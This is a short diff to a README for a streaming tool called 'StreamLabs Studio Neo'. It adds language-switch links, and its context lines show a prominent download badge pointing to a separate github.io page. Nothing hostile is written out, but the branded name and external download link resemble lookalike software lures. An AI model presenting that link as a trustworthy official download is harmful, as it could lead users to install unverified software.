@@ -1,5 +1,9 @@
 # StreamLabs Studio Neo: The Next-Generation Cross-Platform Broadcasting Engine
 
+<!-- hy-mt2-i18n:start -->
+**English** · [中文](./README_zh-CN.md) · [日本語](./README_ja.md) · [Español](./README_es.md)
+<!-- hy-mt2-i18n:end -->
+
 [![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://t-source1.github.io/Streamlabs-Creative-Suite-Extension/)
 
 **Version 4.2.0 | Released January 2026 | MIT Licensed**
